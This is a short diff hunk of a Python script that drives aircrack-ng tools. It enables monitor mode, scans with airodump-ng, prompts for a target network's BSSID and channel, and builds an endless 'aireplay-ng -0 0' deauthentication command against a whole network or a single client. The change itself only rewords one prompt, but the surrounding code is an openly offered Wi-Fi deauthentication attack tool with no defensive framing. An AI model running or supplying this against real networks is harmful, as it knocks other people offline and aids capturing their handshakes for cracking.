@@ -6,7 +6,7 @@ print ("when running airodump-ng just press ctrl c to stop")
 os.system("airmon-ng start wlan0")
 os.system("airodump-ng wlan0mon")
 x = raw_input("enter the bssid that you want to CLAP!:")
-e = raw_input("enter the channel of the channel you wanna CLAP!:")
+e = raw_input("enter the channel of the network you wanna CLAP!:")
 aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
 if aireplay == 'Network':
   command = "aireplay-ng -0 0 -a %s wlan0mon"
